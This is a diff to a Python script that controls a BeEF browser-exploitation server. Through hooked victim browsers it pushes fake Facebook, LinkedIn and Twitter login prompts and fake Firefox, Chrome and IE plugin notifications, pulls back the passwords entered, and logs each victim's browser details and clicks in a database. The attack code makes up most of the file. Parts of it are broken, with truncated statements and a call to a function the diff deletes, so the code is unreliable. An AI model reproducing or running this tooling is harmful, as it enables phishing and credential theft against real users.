@@ -19,7 +19,9 @@ class Browser_Parser:
 		self.browser_id = None
 		self.cert = (self.cert_cert, self.cert_key)
 		self.api_key = self.get_api_key()
+		self.redirect_uri = None
 		self.facebook_prompt_id = None
+		self.user_id =  str(sys.argv[1:])
 
 
 	def get_api_key(self):
@@ -48,8 +50,43 @@ class Browser_Parser:
 			print("error inserting record:", SQE)
 			pass
 
-	def promt_fake_login(self, socnet_choice):
+
+	def get_browser_deets(self, browser_metadata):
+		urll = 'https://192.168.3.1:3000/api/hooks/' + str(self.browser_id) + "?token=" + str(self.api_key)
+		k_une = requests.get(url=urll, cert=self.cert, verify=False)
+		k_dict = json.loads(k_une.text)
+		did_login = self.if_usr_login()
+		did_click = self.if_usr_click()
+		self.insert_into_BrowserTable(self.user_id, self.browser_id, k_dict['BrowserName'], k_dict['BrowserVersion'], k_dict['os'], k_dict['BrowserPlugins'], self.checkIfLoggedin, self.check.)
+
+
+	def insert_into_BrowserTable(self, user_id, hooked_browser_id, browser_name, browser_version, os, browser_plugins, entered_login_yn, clicked_toolbar_yn, recent_redirect):
+		try:
+			print("adding to browser table...")
+			self.cur.execute("INSERT or REPLACE INTO TableB VALUES (?,?,?,?,?,?,?,?,?)", [user_id, hooked_browser_id, browser_name, browser_version, os, browser_plugins, entered_login_yn, clicked_toolbar_yn, recent_redirect])
+			self.connex.commit()
+			print("successfully inserted records into browser table...")
+		except sqlite3.Error as SQE:
+			print("error inserting record:", SQE)
+			pass	
+
+	def promt_fake_login(self):
 		#if self.facebook_prompt_id is None: ./RAP.sh st
+		socnet_choice= str(input("toolbar to send:"))
+		bars = ['facebook', 'linkedin', 'generic', 'twitter']
+		if socnet_choice.lower() not in bars:
+			print("please picka social network")
+			return None
+		elif socnet_choice.lower() == 'facebook':
+			socnet_choice = 'Facebook'
+		elif socnet_choice.lower() == 'linkedin':
+			socnet_choice = 'LinkedIn'
+		elif socnet_choice.lower() == 'youtube':
+			socnet_choice = 'YouTube'
+		elif socnet_choice.lower() == 'generic':
+			socnet_choice = 'Generic'
+		elif socnet_choice.lower() == 'youtube':
+			socnet_choice = 'Youtube'
 		hed = "Content-Type: application/json; charset=UTF-8"
 		to_beef_serv = {'choice': socnet_choice }
 		k_une = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/242?token=" + str(self.api_key), cert=self.cert, verify=False, json=to_beef_serv)
@@ -69,37 +106,47 @@ class Browser_Parser:
 			+ "?token=" 
 			+ str(self.api_key), cert = self.cert, verify=False)
 		c_dict = json.loads(dets.text)
-		pprint.pprint(c_dict)
-		data = json.loads(c_dict['0']['data'])
-		password = str(data['data']).split(":")[1]
-		#send to password table with account as ususal
-		print password
+		try:
+			pprint.pprint(c_dict)
+			data = json.loads(c_dict['0']['data'])
+			password = str(data['data']).split(":")[1]
+			self.
+			#send to password table with account as ususal
+			print password
+		except Error:
+			print("did not get response yet")
+			pass
 
 
 
-
-
-	def fake_firefox(self):
+	def fake_toolbar(self, redirect_url):
+		toolbar_type = str(input("toolbar to send:"))
+		bars = ['firefox', 'chrome', 'ie']
+		if toolbar_type.lower() not in bars:
+			print("please pick firefox, chrome or IE")
+			return None
+		elif toolbar_type.lower() == 'firefox':
+			command_id = 252
+			notification = "An additional plug-in is required to display some elements on this page."
+		elif toolbar_type.lower() == 'chrome':
+			command_id = 256
+			notification = "Additional plugins are required to display all the media on this page."
+		elif toolbar_type.lower() == 'ie':
+			command_id = 263
+			notification = "This website wants to run the following applet: 'Java' from 'Microsoft Inc'. To continue using this website you must accept the following security popup"
 		hed = "Content-Type: application/json; charset=UTF-8"
-		params= {"url" : self.redirect_uri, 'notification_text' : "An additional plug-in is required to display some elements on this page."}
-		f_f = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/252?token=" + str(self.api_key), cert=self.cert, verify=False, json=params)
+		params= {"url" : redirect_url, 'notification_text' : notification}
+		f_f = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/" + str(command_id) + "?token=" + str(self.api_key), cert=self.cert, verify=False, json=params)
 		f_f = json.loads(f_f.text)
-		if k_dict['success'] == "true":
+		if f_f['success'] == "true":
 			print "successfully sent prompt..."
-			print "command id:" + str(k_dict['command_id'])
-			self.facebook_prompt_id = k_dict['command_id']
+			print "command id:" + str(f_f['command_id'])
+			self.toolbar_prompt_id = f_f['command_id']
 		else:
 			print "prompt request unsucessful"
 			return None
 
 	def get_fake_toolbar_result(self):
-		pass
-
-
-	def fake_chrome(self):
-		pass
-
-	def fake_IE(self):
 		pass
 
 	def which_browser(self):
@@ -108,8 +155,8 @@ class Browser_Parser:
 
 	def get_module_deets(self):
 		#debug: helper to get details on modules, delete after use
-		det = requests.get(url="https://192.168.3.1:3000/api/modules/252?token=" + str(self.api_key), cert=self.cert, verify=False)
-		pprint.pprint(json.loads(det.text))
+		det = requests.get(url="https://192.168.3.1:3000/api/modules/263?token=" + str(self.api_key), cert=self.cert, verify=False)
+		pprint.pprint(json.loads(det.text)) 
 		# 242 --> pretty theft, 252 --> firefox fake notification, 256 --> chrome fake bar, 263 --> IE fake bar
 
 
@@ -150,12 +197,6 @@ class Browser_Parser:
 			print "no hooked browser found"
 
 
-	def get_browser_deets(self, browser_metadata):
-		urll = 'https://192.168.3.1:3000/api/hooks/' + str(self.browser_id) + "?token=" + str(self.api_key)
-		k_une = requests.get(url=urll, cert=self.cert, verify=False)
-		k_dict = json.loads(k_une.text)
-		print k_dict
-		#send to database
 
 
 if __name__ == "__main__":
@@ -165,6 +206,5 @@ if __name__ == "__main__":
 	print(str(md))
 	bp.get_module_deets()
 	#bp.promt_fake_login("Facebook")
-	bp.get_prompt_credentials(73, "Facebook")
-
-
+	#bp.get_prompt_credentials(85, "Facebook")
+	bp.fake_firefox()
